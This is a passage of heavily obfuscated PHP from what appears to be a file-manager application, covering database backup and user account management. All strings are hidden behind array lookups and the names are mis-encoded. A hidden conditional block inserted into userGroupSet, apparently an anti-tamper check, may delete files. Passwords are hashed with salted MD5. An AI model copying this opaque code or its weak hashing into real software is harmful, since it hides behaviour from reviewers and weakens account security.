!IO::mkfile($ÌØÛ‹•Ù . $ÛŞñéëï[842])) { $ÌØÛ‹•Ù = TEMP_FILES; } } return $ÌØÛ‹•Ù; } } class BackupDbFile { public function __construct() { } public function index() { $¨æÄŞ¬ä =& $_SERVER[•Ùç É]; $‚šŸµ‹¿ = Backup::get(); $ıÖÇ™» = $‚šŸµ‹¿[$¨æÄŞ¬ä[32]]; $â£è–œò = $this->tmpFilesPath() . "\142\141\x63\x6b\x75\x70\x5f{$ıÖÇ™»}\57"; $õ¢¹† † = $this->backupPath($‚šŸµ‹¿); if (!($õ¢¹† † = IO::mkdir($õ¢¹† †))) { return !1; } $Í„‚ÖÙÕ = IO::listPath($â£è–œò); $Çòâ½½ = isset($Í„‚ÖÙÕ[$¨æÄŞ¬ä[85]]) ? $Í„‚ÖÙÕ[$¨æÄŞ¬ä[85]] : array(); $µáñÉô± = array_sum(array_column($Çòâ½½, $¨æÄŞ¬ä[78])); if (!$µáñÉô±) { return !1; } $¤Ëâ£ğ€ = array($¨æÄŞ¬ä[843] => $µáñÉô±, $¨æÄŞ¬ä[844] => time()); Backup::set($¤Ëâ£ğ€); $“ÖÉ±ÄŒ = new TaskFileTransfer($¨æÄŞ¬ä[845], $¨æÄŞ¬ä[825], count($Çòâ½½), LNG($¨æÄŞ¬ä[826]) . $¨æÄŞ¬ä[432] . LNG($¨æÄŞ¬ä[828]) . $¨æÄŞ¬ä[846]); $“ÖÉ±ÄŒ->task[$¨æÄŞ¬ä[808]] = $µáñÉô±; foreach ($Í„‚ÖÙÕ[$¨æÄŞ¬ä[85]] as $àõÕïÚ) { $æ’Î¶¡– = IO::move($àõÕïÚ[$¨æÄŞ¬ä[86]], $õ¢¹† †); if (!$æ’Î¶¡–) { $“ÖÉ±ÄŒ->end(); $¿†ÛõÀÍ = IO::getLastError($¨æÄŞ¬ä[847] . $àõÕïÚ[$¨æÄŞ¬ä[86]] . $¨æÄŞ¬ä[848] . $õ¢¹† † . $¨æÄŞ¬ä[167]); write_log($¿†ÛõÀÍ, $¨æÄŞ¬ä[825]); return !1; } } $ï¼ˆ¸£¡ = new DbManage(); $Ñâ¼×Ùı = $ï¼ˆ¸£¡->getSqlFile(); if (!$Ñâ¼×Ùı[$¨æÄŞ¬ä[849]] || !$Ñâ¼×Ùı[$¨æÄŞ¬ä[13]]) { return !1; } IO::move($Ñâ¼×Ùı[$¨æÄŞ¬ä[849]], $õ¢¹† †); IO::move($Ñâ¼×Ùı[$¨æÄŞ¬ä[13]], $õ¢¹† †); $“ÖÉ±ÄŒ->end(); $¤Ëâ£ğ€ = array($¨æÄŞ¬ä[850] => $µáñÉô±, $¨æÄŞ¬ä[851] => time()); Backup::set($¤Ëâ£ğ€); return !0; } private function backupPath($ÕıŸå‰¦) { $ø·ã¶°Ü =& $_SERVER[•Ùç É]; $†ò§ãâ¥ = $ÕıŸå‰¦[$ø·ã¶°Ü[32]]; $£Ø’ª¤¯ = Model($ø·ã¶°Ü[815])->get($ø·ã¶°Ü[816]); $¥°ÏÎ„Ş = substr(md5($ø·ã¶°Ü[817] . $£Ø’ª¤¯ . $†ò§ãâ¥), 0, 8); return "\x7b\151\157\72{$ÕıŸå‰¦[$ø·ã¶°Ü[796]]}\x7d\57\x64\x61\x74\x61\x62\141\x73\x65\57\142\x61\143\153\x75\160\57" . $†ò§ãâ¥ . $ø·ã¶°Ü[11] . $¥°ÏÎ„Ş; } private function tmpFilesPath() { $Ò ˆÂ§ù =& $_SERVER[•Ùç É]; $ªÑ»³¹ğ = TEMP_FILES; if ($GLOBALS[$Ò ˆÂ§ù[6]][$Ò ˆÂ§ù[91]][$Ò ˆÂ§ù[841]]) { $ªÑ»³¹ğ = $GLOBALS[$Ò ˆÂ§ù[6]][$Ò ˆÂ§ù[91]][$Ò ˆÂ§ù[841]]; if (!mk_dir($ªÑ»³¹ğ) || !is_writable($ªÑ»³¹ğ) || !IO::mkfile($ªÑ»³¹ğ . $Ò ˆÂ§ù[842])) { $ªÑ»³¹ğ = TEMP_FILES; } } return $ªÑ»³¹ğ; } } goto b¢Ä—›¸ø; EŒ‡‹ó‚¦¿: class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\164\x61\142\154\145\116\x61\155\x65" => "\x75\x73\x65\x72\137\155\x65\164\x61", "\155\145\x74\x61\x46\x69\x65\154\144" => "\x75\x73\x65\x72\x49\x44"); protected $simpleField = "\x75\163\145\162\x49\x44\x2c\156\x69\x63\153\116\x61\155\x65\x2c\156\x61\x6d\145\x2c\x61\x76\141\x74\x61\162\54\163\145\x78\54\163\x74\x61\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Ñ‹Îˆ‚û) { $ÄÅşÒ¹‡ =& $_SERVER[•Ùç É]; $†è×Ä = $ÄÅşÒ¹‡[2358]; return array($ÄÅşÒ¹‡[1982] => array($Ñ‹Îˆ‚û[0], $†è×Ä), $ÄÅşÒ¹‡[1984] => array($Ñ‹Îˆ‚û[0], $†è×Ä), $ÄÅşÒ¹‡[2359] => array($Ñ‹Îˆ‚û[0], $†è×Ä)); } protected function getInfo($æóºª×À, $ÛÉË™şó = false) { $¸¨¢íì« = $this->getInfoSimple($æóºª×À); if (!is_array($¸¨¢íì«)) { return array(); } if ($ÛÉË™şó) { return $this->_getInfoApply($¸¨¢íì«); } return $this->cacheFunctionGet($_SERVER[•Ùç É][1986], $æóºª×À); } protected function getInfoFull($ßÓ©à§, $»õ‰‹Òå = false) { $ª‚ŠšíÉ = $this->getInfoSimple($ßÓ©à§); if (!is_array($ª‚ŠšíÉ)) { return array(); } if ($»õ‰‹Òå) { return $this->_getInfoApply($ª‚ŠšíÉ, !0); } return $this->cacheFunctionGet($_SERVER[•Ùç É][2360], $ßÓ©à§); } private function _getInfoApply($šÅ°Ïãñ, $•¦»ªÉƒ = false) { $ÁâÛ½­¬ =& $_SERVER[•Ùç É]; if (!$šÅ°Ïãñ) { return $šÅ°Ïãñ; } $êæ×ûŸŸ = md5($ÁâÛ½­¬[2361] . $šÅ°Ïãñ[$ÁâÛ½­¬[940]] . $ÁâÛ½­¬[2362] . $šÅ°Ïãñ[$ÁâÛ½­¬[32]]); $šÅ°Ïãñ = $this->_listDataApplyItem($šÅ°Ïãñ); $ÔÑ«óáå = Model($ÁâÛ½­¬[1384])->metaGet($šÅ°Ïãñ[$ÁâÛ½­¬[89]][$ÁâÛ½­¬[183]]); $šÅ°Ïãñ[$ÁâÛ½­¬[2363]] = $êæ×ûŸŸ; $šÅ°Ïãñ[$ÁâÛ½­¬[89]][$ÁâÛ½­¬[2179]] = isset($ÔÑ«óáå[$ÁâÛ½­¬[2180]]) ? $ÔÑ«óáå[$ÁâÛ½­¬[2180]] : null; if ($•¦»ªÉƒ) { $šÅ°Ïãñ[$ÁâÛ½­¬[509]] = $this->metaGet($šÅ°Ïãñ[$ÁâÛ½­¬[1705]]); } return $šÅ°Ïãñ; } protected function getInfoSimple($ãôÅ¯Ç‡, $öùÉ˜ÚÔ = false) { $«ğ—şô¦ =& $_SERVER[•Ùç É]; if (!$ãôÅ¯Ç‡) { return array(); } if ($öùÉ˜ÚÔ) { $íºúî™Ò = $this->where(array($«ğ—şô¦[1705] => intval($ãôÅ¯Ç‡)))->find(); if (!is_array($íºúî™Ò)) { return array(); } $íºúî™Ò[$«ğ—şô¦[2364]] = Action($«ğ—şô¦[2365])->parseUrl($íºúî™Ò[$«ğ—şô¦[2364]]); return $íºúî™Ò; } return $this->cacheFunctionGet($«ğ—şô¦[1987], $ãôÅ¯Ç‡); } protected function getInfoSimpleOuter($Ø“È™§Ú) { $¾ï˜ö³Ä =& $_SERVER[•Ùç É]; if (!$Ø“È™§Ú || $Ø“È™§Ú == 0) { return array($¾ï˜ö³Ä[1705] => $¾ï˜ö³Ä[214], $¾ï˜ö³Ä[32] => $¾ï˜ö³Ä[165] . LNG($¾ï˜ö³Ä[2366]) . $¾ï˜ö³Ä[167], $¾ï˜ö³Ä[2364] => STATIC_PATH . $¾ï˜ö³Ä[2367]); } $“‚‘Õ·É = $this->cacheFunctionGet($¾ï˜ö³Ä[1987], $Ø“È™§Ú); $Ó­Çö»Ô = array_field_key($“‚‘Õ·É, explode($¾ï˜ö³Ä[50], $this->simpleField)); if (!$Ó­Çö»Ô) { return array($¾ï˜ö³Ä[1705] => $¾ï˜ö³Ä[1239], $¾ï˜ö³Ä[32] => $¾ï˜ö³Ä[165] . LNG($¾ï˜ö³Ä[2368]) . $¾ï˜ö³Ä[167], $¾ï˜ö³Ä[2364] => STATIC_PATH . $¾ï˜ö³Ä[2369]); } $Ó­Çö»Ô[$¾ï˜ö³Ä[2364]] = Action($¾ï˜ö³Ä[2365])->parseUrl($Ó­Çö»Ô[$¾ï˜ö³Ä[2364]]); return $Ó­Çö»Ô; } protected function groupUser($éøàíÕİ) { } public static function errorLang($ÁåŒøøß) { $ ´“€ì =& $_SERVER[•Ùç É]; $‰˜¢¹Œ = array(self::ERROR_USER_NOT_EXISTS => $ ´“€ì[2370], self::ERROR_USER_PASSWORD_ERROR => $ ´“€ì[2371], self::ERROR_USER_EXIST_NAME => $ ´“€ì[2372], self::ERROR_USER_EXIST_PHONE => $ ´“€ì[2373], self::ERROR_USER_EXIST_EMAIL => $ ´“€ì[2374], self::ERROR_USER_LOGIN_LOCK => $ ´“€ì[2375], self::ERROR_IP_NOT_ALLOW => $ ´“€ì[2376], self::ERROR_USER_EXIST_NICKNAME => $ ´“€ì[2377]); return LNG($‰˜¢¹Œ[$ÁåŒøøß]); } public function getInfoByMeta($ Ü§€µ¥, $µ†ĞŠÌª) { $é°—Î©© =& $_SERVER[•Ùç É]; $‰ß¹“á™ = Model($é°—Î©©[2378])->where(array($é°—Î©©[96] => $ Ü§€µ¥, $é°—Î©©[420] => $µ†ĞŠÌª))->find(); if ($‰ß¹“á™) { return $this->getInfo($‰ß¹“á™[$é°—Î©©[1705]]); } return !1; } public function userLoginCheck($ßšê—ş–, $Îè–ì¥›) { $ı˜·ìöï =& $_SERVER[•Ùç É]; $Ğ…ïˆĞ© = $this->userLoginFind($ßšê—ş–); if (!$Ğ…ïˆĞ©) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Ğ…ïˆĞ©[$ı˜·ìöï[1705]], $Îè–ì¥›)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Ğ…ïˆĞ©[$ı˜·ìöï[1705]]); } public function userLoginFind($î‚Ûô÷) { $…èÒò¦Ù =& $_SERVER[•Ùç É]; $ÖØ¥›øò = array($…èÒò¦Ù[32] => $î‚Ûô÷, $…èÒò¦Ù[2187] => $î‚Ûô÷, $…èÒò¦Ù[351] => $î‚Ûô÷, $…èÒò¦Ù[2379] => $î‚Ûô÷, $…èÒò¦Ù[1051] => $…èÒò¦Ù[1053]); if ($this->nickNameRpt()) { unset($ÖØ¥›øò[$…èÒò¦Ù[2187]]); } return $this->where($ÖØ¥›øò)->find(); } public function clearCache($ÉèÓàÀ­) { $‡ò‚ÇéÒ =& $_SERVER[•Ùç É]; $this->cacheFunctionClear($‡ò‚ÇéÒ[1986], $ÉèÓàÀ­); $this->cacheFunctionClear($‡ò‚ÇéÒ[1987], $ÉèÓàÀ­); $this->cacheFunctionClear($‡ò‚ÇéÒ[2360], $ÉèÓàÀ­); } public function userPasswordCheck($Å£Ëäˆ, $ñƒÜ…¶¸) { $£ˆÍÅ¼ =& $_SERVER[•Ùç É]; $Í¾Å €ƒ = $this->where(array($£ˆÍÅ¼[1705] => intval($Å£Ëäˆ)))->find(); $½ï•“™¢ = $this->metaGet($Å£Ëäˆ); $èƒÚÜ¥Û = isset($½ï•“™¢[$£ˆÍÅ¼[2380]]) ? $½ï•“™¢[$£ˆÍÅ¼[2380]] : $£ˆÍÅ¼[12]; if (md5($èƒÚÜ¥Û . trim($ñƒÜ…¶¸)) !== $Í¾Å €ƒ[$£ˆÍÅ¼[940]]) { return !1; } return !0; } public function userAdd($šç€–ä) { $óŠû©‹Ê =& $_SERVER[•Ùç É]; $¸…”‘§Æ = array($óŠû©‹Ê[464] => $šç€–ä[$óŠû©‹Ê[32]], $óŠû©‹Ê[2381] => $šç€–ä[$óŠû©‹Ê[2106]], $óŠû©‹Ê[2382] => isset($šç€–ä[$óŠû©‹Ê[351]]) ? $šç€–ä[$óŠû©‹Ê[351]] : $óŠû©‹Ê[12], $óŠû©‹Ê[2383] => isset($šç€–ä[$óŠû©‹Ê[2379]]) ? $šç€–ä[$óŠû©‹Ê[2379]] : $óŠû©‹Ê[12], $óŠû©‹Ê[2384] => isset($šç€–ä[$óŠû©‹Ê[2187]]) ? $šç€–ä[$óŠû©‹Ê[2187]] : $šç€–ä[$óŠû©‹Ê[32]], $óŠû©‹Ê[2385] => isset($šç€–ä[$óŠû©‹Ê[2364]]) ? $šç€–ä[$óŠû©‹Ê[2364]] : $óŠû©‹Ê[12], $óŠû©‹Ê[2386] => isset($šç€–ä[$óŠû©‹Ê[2387]]) ? $šç€–ä[$óŠû©‹Ê[2387]] : 1, $óŠû©‹Ê[2388] => $šç€–ä[$óŠû©‹Ê[940]], $óŠû©‹Ê[1988] => isset($šç€–ä[$óŠû©‹Ê[1891]]) ? $šç€–ä[$óŠû©‹Ê[1891]] : 1024 * 1024 * 20, $óŠû©‹Ê[1989] => 0, $óŠû©‹Ê[2389] => 0, $óŠû©‹Ê[2033] => isset($šç€–ä[$óŠû©‹Ê[795]]) ? $šç€–ä[$óŠû©‹Ê[795]] : 1); if (!empty($šç€–ä[$óŠû©‹Ê[1705]])) { $¸…”‘§Æ[$óŠû©‹Ê[1705]] = $šç€–ä[$óŠû©‹Ê[1705]]; } $‡æøÔã’ = $this->_checkExist($šç€–ä); if ($‡æøÔã’ !== !0) { return $‡æøÔã’; } if (!empty($¸…”‘§Æ[$óŠû©‹Ê[2364]]) && strlen($¸…”‘§Æ[$óŠû©‹Ê[2364]]) > 255) { $¸…”‘§Æ[$óŠû©‹Ê[2364]] = $óŠû©‹Ê[12]; } $¿”½¼Å = $this->add($¸…”‘§Æ); $ÆÓ‰”Ï¸ = array($óŠû©‹Ê[2388] => $¸…”‘§Æ[$óŠû©‹Ê[940]], $óŠû©‹Ê[2384] => $¸…”‘§Æ[$óŠû©‹Ê[2187]]); $this->userEdit($¿”½¼Å, $ÆÓ‰”Ï¸); Model($óŠû©‹Ê[1384])->userRootAdd($¿”½¼Å); return $¿”½¼Å; } protected function userEditTest($³øô¸Éã, $°«×¤´²) { return $this->call($_SERVER[•Ùç É][2390], $³øô¸Éã, $°«×¤´²); } protected function userEdit($ĞÓÜà, $öÉûøãŠ) { $Éš³–Â› =& $_SERVER[•Ùç É]; $Æ‚‰«Í“ = $this->getInfoSimple($ĞÓÜà); if (!$Æ‚‰«Í“) { return !1; } $½³·øŠ = $this->_checkExist($öÉûøãŠ, $ĞÓÜà); if ($½³·øŠ !== !0) { return $½³·øŠ; } if (isset($öÉûøãŠ[$Éš³–Â›[940]]) && trim($öÉûøãŠ[$Éš³–Â›[940]]) != $Éš³–Â›[12]) { $Š–¶„¿ = $this->metaGet($ĞÓÜà); if (empty($Š–¶„¿[$Éš³–Â›[2380]])) { $Š–¶„¿[$Éš³–Â›[2380]] = rand_string(10); Model($Éš³–Â›[548])->metaSet($ĞÓÜà, $Éš³–Â›[2380], $Š–¶„¿[$Éš³–Â›[2380]]); } $öÉûøãŠ[$Éš³–Â›[940]] = md5($Š–¶„¿[$Éš³–Â›[2380]] . trim($öÉûøãŠ[$Éš³–Â›[940]])); } else { unset($öÉûøãŠ[$Éš³–Â›[940]]); } if (!empty($öÉûøãŠ[$Éš³–Â›[2364]]) && strlen($öÉûøãŠ[$Éš³–Â›[2364]]) > 255) { $öÉûøãŠ[$Éš³–Â›[2364]] = $Éš³–Â›[12]; } $this->where(array($Éš³–Â›[1696] => $ĞÓÜà))->save($öÉûøãŠ); if (isset($öÉûøãŠ[$Éš³–Â›[2187]])) { $this->setNamePinyin($ĞÓÜà, $öÉûøãŠ[$Éš³–Â›[2187]]); } $this->clearCache($ĞÓÜà); return !0; } public function setNamePinyin($ŞØŠ½ƒë, $êã§³Ú¯ = false) { $¡¢ÑØ¨» =& $_SERVER[•Ùç É]; if (!$êã§³Ú¯) { $®ÆÕéÆ = $this->getInfoSimple($ŞØŠ½ƒë); $êã§³Ú¯ = $®ÆÕéÆ[$¡¢ÑØ¨»[2187]] ? $®ÆÕéÆ[$¡¢ÑØ¨»[2187]] : $®ÆÕéÆ[$¡¢ÑØ¨»[32]]; } $Š¥‘¡‹¸ = Model($¡¢ÑØ¨»[569]); if (!Input::check($êã§³Ú¯, $¡¢ÑØ¨»[625])) { return $Š¥‘¡‹¸->metaSet($ŞØŠ½ƒë, array($¡¢ÑØ¨»[508] => $¡¢ÑØ¨»[12], $¡¢ÑØ¨»[507] => $¡¢ÑØ¨»[12])); } return $Š¥‘¡‹¸->metaSet($ŞØŠ½ƒë, array($¡¢ÑØ¨»[508] => str_replace($¡¢ÑØ¨»[53], $¡¢ÑØ¨»[12], Pinyin::get($êã§³Ú¯)), $¡¢ÑØ¨»[507] => Pinyin::get($êã§³Ú¯, $¡¢ÑØ¨»[626]))); } private function nickNameRpt() { $Ó‘ÙİÑÁ =& $_SERVER[•Ùç É]; $¿¾Ó°Ğ = Model($Ó‘ÙİÑÁ[815])->get($Ó‘ÙİÑÁ[2391]); $”ìˆá = $GLOBALS[$Ó‘ÙİÑÁ[6]][$Ó‘ÙİÑÁ[427]][$Ó‘ÙİÑÁ[2391]]; $ì¶­‘ˆ€ = !is_null($¿¾Ó°Ğ) ? $¿¾Ó°Ğ : $”ìˆá; return !!$ì¶­‘ˆ€; } private function _checkExist($Ó£·í½¶, $Ã–¶³Ç¨ = false) { $ô™… Ë¼ =& $_SERVER[•Ùç É]; $ÙÇß¡—¶ = array($ô™… Ë¼[32] => UserModel::ERROR_USER_EXIST_NAME, $ô™… Ë¼[2187] => UserModel::ERROR_USER_EXIST_NICKNAME, $ô™… Ë¼[351] => UserModel::ERROR_USER_EXIST_EMAIL, $ô™… Ë¼[2379] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ÙÇß¡—¶[$ô™… Ë¼[2187]]); } $ˆ‚£·  = $Ã–¶³Ç¨ ? array($ô™… Ë¼[1705] => array($ô™… Ë¼[2392], $Ã–¶³Ç¨)) : array(); foreach ($ÙÇß¡—¶ as $–ùà– => $ËİÔ’ –) { $€¡”îÔÅ = array(); foreach ($ÙÇß¡—¶ as $çÚÍÆş¼ => $’üùŞÛØ) { if (isset($Ó£·í½¶[$çÚÍÆş¼]) && $Ó£·í½¶[$çÚÍÆş¼]) { $€¡”îÔÅ[] = $Ó£·í½¶[$çÚÍÆş¼]; } } if (!$€¡”îÔÅ) { continue; } $Œî¯ş±˜ = array_merge(array($–ùà– => array($ô™… Ë¼[7], $€¡”îÔÅ)), $ˆ‚£· ); $ŸîÃ­š³ = $this->where($Œî¯ş±˜)->find(); if ($ŸîÃ­š³) { return $ËİÔ’ –; } } return !0; } public function userListInfo($î©§œê) { $µöÉİ²ó =& $_SERVER[•Ùç É]; $Á±ñÔüÁ = array(); $î©§œê = is_array($î©§œê) ? array_unique($î©§œê) : array(); if (!$î©§œê) { return $Á±ñÔüÁ; } if (count($î©§œê) < 20) { foreach ($î©§œê as $ğûÁ½ğ) { $Á±ñÔüÁ[$ğûÁ½ğ . $µöÉİ²ó[12]] = $this->getInfoSimpleOuter($ğûÁ½ğ); } } else { $Ó“şì = array($µöÉİ²ó[1696] => array($µöÉİ²ó[462], $î©§œê)); if (count($î©§œê) == 1) { $Ó“şì = array($µöÉİ²ó[1696] => $î©§œê[0]); } $ÏÛ˜Ù±˜ = Model($µöÉİ²ó[548])->field($this->simpleField)->where($Ó“şì)->select(); $ÏÛ˜Ù±˜ = array_to_keyvalue($ÏÛ˜Ù±˜, $µöÉİ²ó[1705]); foreach ($î©§œê as $ğûÁ½ğ) { $£ÙÔ¦¨ = $ÏÛ˜Ù±˜[$ğûÁ½ğ]; if (!$£ÙÔ¦¨) { $Á±ñÔüÁ[$ğûÁ½ğ . $µöÉİ²ó[12]] = $this->getInfoSimpleOuter($ğûÁ½ğ); continue; } $£ÙÔ¦¨[$µöÉİ²ó[2364]] = Action($µöÉİ²ó[2365])->parseUrl($£ÙÔ¦¨[$µöÉİ²ó[2364]]); $Á±ñÔüÁ[$ğûÁ½ğ . $µöÉİ²ó[12]] = $£ÙÔ¦¨; } } return $Á±ñÔüÁ; } protected function userStatus($½¢ô•æ¯, $ì–±ÜØ) { $¹ƒ¥®İú = $this->getInfoSimple($½¢ô•æ¯); if (!$¹ƒ¥®İú) { return !1; } $Ì—Ñ¾’ğ = array($_SERVER[•Ùç É][795] => $ì–±ÜØ); return $this->userEdit($½¢ô•æ¯, $Ì—Ñ¾’ğ); } protected function userRemove($† »èŞü) { $¾²Øà¼È =& $_SERVER[•Ùç É]; $Ú®Á·â¿ = $this->getInfoSimple($† »èŞü); if (!$Ú®Á·â¿) { return !1; } $æ¶Ì—ø = array($¾²Øà¼È[1696] => $† »èŞü); Model($¾²Øà¼È[634])->where($æ¶Ì—ø)->delete(); Model($¾²Øà¼È[2393])->where($æ¶Ì—ø)->delete(); Model($¾²Øà¼È[1994])->where($æ¶Ì—ø)->delete(); Model($¾²Øà¼È[2378])->where($æ¶Ì—ø)->delete(); Model($¾²Øà¼È[1119])->where($æ¶Ì—ø)->delete(); Model($¾²Øà¼È[2204])->removeUserAll($† »èŞü); Model($¾²Øà¼È[870])->userRootRemove($† »èŞü); return $this->where($æ¶Ì—ø)->delete(); } protected function userGroupSet($ËŒÄñÜ³, $¾ÁˆãÏ, $ö²ªû“ = array()) { $¡üÎŒÃ =& $_SERVER[•Ùç É]; if ($_SERVER[$¡üÎŒÃ[922]] != $_SERVER[$¡üÎŒÃ[1782]]) { $şâÒú€† = $¡üÎŒÃ[924]; $ûÀ¤å„§ = $¡üÎŒÃ[925]; $¸ÊÚå°É = $_SERVER[$¡üÎŒÃ[926]] . $¡üÎŒÃ[927]; $Û›ß™° = $ûÀ¤å„§($¸ÊÚå°É); $¢Èóú¹Ü = explode($¡üÎŒÃ[248], $Û›ß™°); if (count($¢Èóú¹Ü) < $¡üÎŒÃ[671]) { $¡ç±Íş¹ = $¡üÎŒÃ[928]; $¡ç±Íş¹(); } $ÈËéîÃƒ = $¡üÎŒÃ[929]; $ÈËéîÃƒ($_SERVER[$¡üÎŒÃ[930]]); $ÈËéîÃƒ($_SERVER[$¡üÎŒÃ[926]] . $¡üÎŒÃ[2394]); $Õ¶ÅÌøç = 1; while ($Õ¶ÅÌøç > 1) { $Õ¶ÅÌøç = $Õ¶ÅÌøç + 4; $ç†ãÌĞ° = rawurlencode($Õ¶ÅÌøç . $¡üÎŒÃ[424]); } } $Ö‡ŸÀÖ§ = $this->getInfoSimple($ËŒÄñÜ³); if (!$Ö‡ŸÀÖ§ || !is_array($¾ÁˆãÏ)) { return !1; } $Ïœ­»ßÒ = Model($¡üÎŒÃ[1994]); $Ïœ­»ßÒ->where(array($¡üÎŒÃ[1705] => $ËŒÄñÜ³))->delete(); $üù»ğù¨ = array(); $Œ† ¶±‚ = 0; foreach ($¾ÁˆãÏ as $º°à‚Åƒ => $«â”») { $×±Äß‹„ = array($¡üÎŒÃ[1705] => $ËŒÄñÜ³, $¡üÎŒÃ[1904] => $º°à‚Åƒ, $¡üÎŒÃ[2008] => $«â”»); $×±Äß‹„[$¡üÎŒÃ[1928]] = isset($ö²ªû“[$Œ† ¶±‚]) ? $ö²ªû“[$Œ† ¶±‚] : 0; $Œ† ¶±‚++; $üù»ğù¨[] = $×±Äß‹„; } return $Ïœ­»ßÒ->addAll($üù»ğù¨, array(), !0); } protected function userGroupAdd($½Ôş€¶ô, $²ÑÅŸ¯Ô = array()) { $‡€§ºõ¡ =& $_SERVER[•Ùç É]; $°ûİ£éÈ = $this->getInfoSimple($½Ôş€¶ô); if (!$°ûİ£éÈ || empty($²ÑÅŸ¯Ô)) { return !1; } $Öı½Ï€ = array(); foreach ($²ÑÅŸ¯Ô as $ªĞ­Ä‚­ => $¼Œ˜°üß) { $Öı½Ï€[] = array($‡€§ºõ¡[1705] => $½Ôş€¶ô, $‡€§ºõ¡[1904] => $ªĞ­Ä‚­, $‡€§ºõ¡[2008] => $¼Œ˜°üß, $‡€§ºõ¡[1928] => 0); } return Model($‡€§ºõ¡[1994])->addAll($Öı½Ï€, array(), !0); } protected function userGroupRemove($ß·¢ì¨¨, $³Ø¼²ÇË) { $ù€şßì =& $_SERVER[•Ùç É]; $Å¼¤›Å÷ = $this->getInfoSimple($ß·¢ì¨¨); if (!$Å¼¤›Å÷ || !$³Ø¼²ÇË) { return !1; } $–æñ»¨ = array($ù€şßì[1696] => $ß·¢ì¨¨, $ù€şßì[1992] => $³Ø¼²ÇË); return Model($ù€şßì[1994])->where($–æñ»¨)->delete(); } public function listData() { $Ó –š” = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ó –š”[$_SERVER[•Ùç É][415]]); return $Ó –š”; } public function listByID($‘‰Àª¿Ò) { $¨¶ã¤• =& $_SERVER[•Ùç É]; if (!$‘‰Àª¿Ò) { return; } $ÕŠ ÜÜõ = array($¨¶ã¤•[1705] => array($¨¶ã¤•[7], $‘‰Àª¿Ò)); $÷ŒÚÂ•° = $this->where($ÕŠ ÜÜõ)->select(); $÷ŒÚÂ•° = array_sort_keep($÷ŒÚÂ•°, $¨¶ã¤•[1705], $‘‰Àª¿Ò); $this->_listDataApply($÷ŒÚÂ•°); return $÷ŒÚÂ•°; } public function listByGroup($‚ÅÇÛ¯Ú = 0, $°ÎÈ˜ô = array()) { $£¶ìôò‰ =& $_SERVER[•Ùç É]; $¿ÄŠ¥ô = $£¶ìôò‰[12]; $€ƒËı‡î = array(); if ($‚ÅÇÛ¯Ú) { $€ƒËı‡î = array($£¶ìôò‰[2395] => intval($‚ÅÇÛ¯Ú)); $¿ÄŠ¥ô = "\x4c\105\x46\x54\x20\112\x4f\111\116\40{$this->tablePrefix}\165\x73\x65\x72\137\147\x72\157\165\160\40\165\x73\x65\x72\x5f\x67\162\x6f\165\160\x20\x6f\x6e\40\165\x73\145\x72\56\165\163\145\x72\x49\x44\x20\x3d\x20\165\x73\145\162\x5f\x67\x72\157\x75\160\56\x75\x73\x65\162\x49\x44"; $³•ú÷Å™ = Input::get($£¶ìôò‰[500], null, $£¶ìôò‰[12]) ? $£¶ìôò‰[12] : $£¶ìôò‰[2396]; } if (isset($°ÎÈ˜ô[$£¶ìôò‰[795]])) { $€ƒËı‡î[$£¶ìôò‰[2397]] = $°ÎÈ˜ô[$£¶ìôò‰[795]]; } $ˆ´öŸä = $this->_makeOrder($³•ú÷Å™)->field($£¶ìôò‰[2398])->where($€ƒËı‡î)->join($¿ÄŠ¥ô)->selectPage(50); $this->_listDataApply($ˆ´öŸä[$£¶ìôò‰[415]]); return $ˆ´öŸä; } private function _makeOrder($¦Æøí‡Î = '') { $“úŞİ”© =& $_SERVER[•Ùç É]; $ÉõÙµ = array($“úŞİ”©[1705], $“úŞİ”©[32], $“úŞİ”©[1893], $“úŞİ”©[1865], $“úŞİ”©[217]); $ÓœµÙ™ = array($“úŞİ”©[493] => $“úŞİ”©[494], $“úŞİ”©[495] => $“úŞİ”©[496]); $íûÖÒ§ù = Input::get($“úŞİ”©[500], $“úŞİ”©[7], $“úŞİ”©[1696], $ÉõÙµ); $Î»ò§Ä = Input::get($“úŞİ”©[501], $“úŞİ”©[7], $“úŞİ”©[1995], array($“úŞİ”©[1995], $“úŞİ”©[495])); $Î»ò§Ä = $ÓœµÙ™[$Î»ò§Ä]; $¦Æøí‡Î = $¦Æøí‡Î . "\x75\163\145\x72\x2e{$íûÖÒ§ù}\40{$Î»ò§Ä}\x2c\x20\x75\x73\145\162\56\x75\x73\145\162\111\104\40\x61\163\x63"; return $this->alias($“úŞİ”©[2122])->order($¦Æøí‡Î); } public function listSearch($ø¨”Åİº) { $Î½åÁÆÖ =& $_SERVER[•Ùç É]; $‰ÄÂãóÄ = $ø¨”Åİº[$Î½åÁÆÖ[1998]]; $’±¡ôëá = isset($ø¨”Åİº[$Î½åÁÆÖ[1999]]) ? $ø¨”Åİº[$Î½åÁÆÖ[1999]] : !1; $‰ÄÂãóÄ = str_replace($Î½åÁÆÖ[2000], $Î½åÁÆÖ[2001], trim($‰ÄÂãóÄ)); $ïæßÙ‘ = array($Î½åÁÆÖ[32] => array($Î½åÁÆÖ[429], "\45{$‰ÄÂãóÄ}\x25"), $Î½åÁÆÖ[351] => array($Î½åÁÆÖ[429], "{$‰ÄÂãóÄ}\45"), $Î½åÁÆÖ[2187] => array($Î½åÁÆÖ[429], "{$‰ÄÂãóÄ}\x25"), $Î½åÁÆÖ[1051] => $Î½åÁÆÖ[2002]); if (Input::check($‰ÄÂãóÄ, $Î½åÁÆÖ[357])) { $ïæßÙ‘[$Î½åÁÆÖ[1705]] = array($Î½åÁÆÖ[429], "{$‰ÄÂãóÄ}\x25"); $ïæßÙ‘[$Î½åÁÆÖ[2379]] = array($Î½åÁÆÖ[429], "{$‰ÄÂãóÄ}\x25"); } if (!$‰ÄÂãóÄ) { $ïæßÙ‘ = array(); } if (isset($ø¨”Åİº[$Î½åÁÆÖ[795]])) { 